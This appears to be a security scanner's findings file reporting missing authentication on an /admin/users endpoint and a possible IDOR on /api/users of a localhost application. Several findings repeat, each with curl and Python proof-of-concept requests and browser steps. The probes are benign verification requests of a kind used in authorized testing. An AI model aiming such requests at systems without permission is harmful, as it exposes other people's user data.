findings.title: Missing authentication on http://localhost:5001/admin/users
findings.poc_curl: curl -X GET 'http://localhost:5001/admin/users' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -H 'Accept: application/json' -H 'Connection: close' --max-time 10
poc_steps: 1. Open a web browser (Chrome, Firefox, etc.)
2. Navigate to the URL: http://localhost:5001/admin/users
3. Observe the browser's developer tools network tab (F12 → Network tab)
4. Check the HTTP response status code - it should be 200 OK
5. Verify the response contains user data without requiring login
6. Note that no authentication cookies or headers were required to access this admin endpoint

findings.title: Missing authentication on http://localhost:5001/admin/users
findings.poc_curl: curl -X GET 'http://localhost:5001/admin/users' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -v
findings.poc_python:
import requests

url = 'http://localhost:5001/admin/users'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0'
}

print('Testing endpoint without authentication...')
response = requests.get(url, headers=headers)
print(f'Status Code: {response.status_code}')
print(f'Response Size: {len(response.content)} bytes')
print(f'Response Headers: {response.headers}')
print(f'Response Body (first 500 chars): {response.text[:500]}')

if response.status_code == 200:
    print('\nVULNERABILITY CONFIRMED: Admin endpoint accessible without authentication')
else:
    print('\nEndpoint requires authentication or returned different status')
poc_steps: 1. Open a web browser (Chrome, Firefox, Edge, etc.)
2. Ensure you are NOT logged into the application at http://localhost:5001
3. Clear any existing cookies/session data for localhost:5001
4. Open Developer Tools (F12 or right-click > Inspect)
5. Go to the Network tab and ensure recording is enabled
6. In the address bar, navigate to: http://localhost:5001/admin/users
7. Observe the network request in Developer Tools
8. Verify the response returns HTTP 200 status code
9. Check the response body contains user data (approximately 357 bytes as indicated)

findings.title: Potential IDOR in http://localhost:5001/api/users/1
findings.poc_python:
import requests

url = 'http://localhost:5001/api/users/2'
headers = {
    'Authorization': 'Bearer <AUTH_TOKEN>',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
}

response = requests.get(url, headers=headers)
print(f'Status Code: {response.status_code}')
print(f'Response: {response.text}')
poc_steps: 1. Open browser developer tools (F12)
2. Navigate to http://localhost:5001/api/users/1
3. Observe successful response (200 OK)
4. Modify the URL in the address bar to http://localhost:5001/api/users/2
5. Press Enter to send the request
6. Verify the response returns 200 OK with user data for ID 2
7. Repeat with other IDs to confirm unauthorized access

findings.poc_python:
import requests

url = 'http://localhost:5001/admin/users'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0'
}

print('Testing endpoint without authentication...')
response = requests.get(url, headers=headers)
print(f'Status Code: {response.status_code}')
print(f'Response Size: {len(response.content)} bytes')
print(f'Response Headers: {response.headers}')
print(f'Response Body (first 500 chars): {response.text[:500]}')

if response.status_code == 200:
    print('\nVULNERABILITY CONFIRMED: Admin endpoint accessible without authentication')
else:
    print('\nEndpoint requires authentication or is not vulnerable')
poc_steps: 1. Open a web browser (Chrome, Firefox, etc.)
2. Press F12 to open Developer Tools
3. Navigate to the Network tab
4. In the address bar, enter: http://localhost:5001/admin/users
5. Press Enter to load the page
6. In the Network tab, look for the request to /admin/users
7. Click on the request to view details
8. Verify the response status is 200 OK
9. Check the response body for sensitive user data (should be visible without authentication)
10. Note that no authentication cookies or headers were required to access this admin endpoint
